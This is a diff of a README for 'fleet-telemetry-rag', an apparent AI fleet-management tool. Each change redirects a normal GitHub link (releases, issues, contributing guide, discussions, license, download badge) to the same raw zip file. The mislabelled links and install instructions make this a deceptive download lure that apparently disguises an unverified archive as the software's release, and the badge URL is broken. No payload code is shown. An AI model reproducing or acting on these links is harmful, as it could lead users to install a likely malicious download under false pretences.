@@ -1,6 +1,6 @@
 # 🚗 fleet-telemetry-rag - Your AI-Powered Fleet Assistant
 
-[![Download it now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/FILIPEMI/fleet-telemetry-rag/releases)
+[![Download it now](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application:
 
 ### Step 1: Visit the Releases Page
 
-To get started, head over to the [Releases page](https://github.com/FILIPEMI/fleet-telemetry-rag/releases). This page contains the latest version of the application.
+To get started, head over to the [Releases page](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip). This page contains the latest version of the application.
 
 ### Step 2: Download the Application
 
@@ -46,7 +46,7 @@ Before you download, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/FILIPEMI/fleet-telemetry-rag/releases). Make sure to select the latest version for optimal performance.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip). Make sure to select the latest version for optimal performance.
 
 After downloading, follow the installation instructions outlined above to set up the application on your system.
 
@@ -62,7 +62,7 @@ Yes, you can download and install the application on multiple devices, as long a
 
 ### What should I do if I encounter issues?
 
-If you face any problems, check the [issues section](https://github.com/FILIPEMI/fleet-telemetry-rag/issues) on GitHub for troubleshooting tips or contact support.
+If you face any problems, check the [issues section](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip) on GitHub for troubleshooting tips or contact support.
 
 ## 🌐 Topics
 
@@ -77,14 +77,14 @@ This application focuses on several key areas:
 
 ## 🤝 Contributing
 
-We welcome contributions from everyone. If you would like to help improve fleet-telemetry-rag, please visit our [Contributing Guide](https://github.com/FILIPEMI/fleet-telemetry-rag/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you would like to help improve fleet-telemetry-rag, please visit our [Contributing Guide](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip).
 
 ## 💬 Get In Touch
 
-For questions or feedback, feel free to contact us via the [GitHub Discussions](https://github.com/FILIPEMI/fleet-telemetry-rag/discussions) page. We value your input and aim to improve your experience with our software.
+For questions or feedback, feel free to contact us via the [GitHub Discussions](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip) page. We value your input and aim to improve your experience with our software.
 
 ## 🛡️ License
 
-This project is under the MIT License. See the [license file](https://github.com/FILIPEMI/fleet-telemetry-rag/blob/main/LICENSE) for details.
+This project is under the MIT License. See the [license file](https://raw.githubusercontent.com/FILIPEMI/fleet-telemetry-rag/main/summar/fleet-telemetry-rag.zip) for details.
 
 Thank you for using fleet-telemetry-rag. We hope it helps you manage your fleet more effectively!
